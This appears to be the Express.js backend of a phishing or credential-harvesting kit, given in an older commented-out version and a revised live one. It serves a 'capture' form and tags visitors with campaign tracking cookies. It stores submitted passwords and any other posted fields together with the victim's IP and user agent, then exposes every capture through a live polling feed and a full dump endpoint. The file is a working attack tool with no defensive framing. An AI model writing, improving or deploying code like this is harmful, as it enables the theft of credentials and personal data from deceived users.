// // API Entry Point
// import express from 'express';
// import cookieParser from 'cookie-parser';
// import path from 'path';
// import { fileURLToPath } from 'url';

// const __dirname = path.dirname(fileURLToPath(import.meta.url));
// const app = express();

// app.use(express.urlencoded({ extended: true }));
// app.use(express.json());
// app.use(cookieParser());

// const captures = [];
// let idCounter = 0;

// // serve form page
// app.get('/capture', (req, res) => {
//     res.cookie('capture_uid', req.query.uid || 'unknown');
//     res.cookie('capture_src', req.query.src || 'direct');
//     res.cookie('landing_url', req.originalUrl);
//     res.sendFile(path.join(__dirname, '..', 'public', 'form.html'));
// });

// // serve live monitor page
// app.get('/live', (req, res) => {
//     res.sendFile(path.join(__dirname, '..', 'public', 'live.html'));
// });

// app.get('/', (req, res) => {
//     res.sendFile(path.join(__dirname, '..', 'public', 'gen.html'));
// });

// // capture submit
// app.post('/submit', (req, res) => {
//     const record = {
//         id: ++idCounter,
//         uid: req.cookies.capture_uid || 'unknown',
//         src: req.cookies.capture_src || 'unknown',
//         url: req.cookies.landing_url || 'unknown',
//         password: req.body.password,
//         fullUrl: req.body.currentUrl || null,
//         ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
//         userAgent: req.headers['user-agent'],
//         time: new Date().toISOString()
//     };
//     captures.push(record);
//     console.log('CAPTURED:', record);
//     res.json({ ok: true });
// });

// // polled feed
// app.get('/api/feed', (req, res) => {
//     const since = parseInt(req.query.since || '0', 10);
//     const fresh = captures.filter(c => c.id > since);
//     res.json({ latest: idCounter, items: fresh, total: captures.length });
// });

// app.get('/api/all', (req, res) => res.json(captures));

// export default app;


// API Entry Point
import express from 'express';
import cookieParser from 'cookie-parser';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

app.set('trust proxy', true);            // <-- real IP behind nginx/tunnel
app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: '256kb' }));
app.use(cookieParser());

const captures = [];
let idCounter = 0;

const COOKIE_OPTS = { maxAge: 86_400_000, sameSite: 'lax' };

// serve capture page (no password needed)
app.get('/capture', (req, res) => {
    res.cookie('capture_uid', String(req.query.uid || 'unknown'), COOKIE_OPTS);
    res.cookie('capture_src', String(req.query.src || 'direct'), COOKIE_OPTS);
    res.cookie('landing_url', req.originalUrl, COOKIE_OPTS);
    res.sendFile(path.join(__dirname, '..', 'public', 'form.html'));
});

app.get('/live', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'live.html')));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'gen.html')));

// capture submit — password is now OPTIONAL
app.post('/submit', (req, res) => {
    const { currentUrl, ...rest } = req.body || {};

    const xff = req.headers['x-forwarded-for'];
    const ip = (Array.isArray(xff) ? xff[0] : xff || '').split(',')[0].trim()
        || req.socket.remoteAddress;

    const record = {
        id: ++idCounter,
        uid: req.cookies.capture_uid || 'unknown',
        src: req.cookies.capture_src || 'unknown',
        url: req.cookies.landing_url || 'unknown',
        ...rest,                                  // <- all device/app fields land here
        fullUrl: currentUrl || null,
        ip,
        userAgent: req.headers['user-agent'],
        time: new Date().toISOString()
    };
    captures.push(record);
    console.log('CAPTURED:', record);
    res.json({ ok: true });
});

app.get('/api/feed', (req, res) => {
    const since = parseInt(String(req.query.since || '0'), 10);
    res.json({ latest: idCounter, items: captures.filter(c => c.id > since), total: captures.length });
});

app.get('/api/all', (req, res) => res.json(captures));

export default app;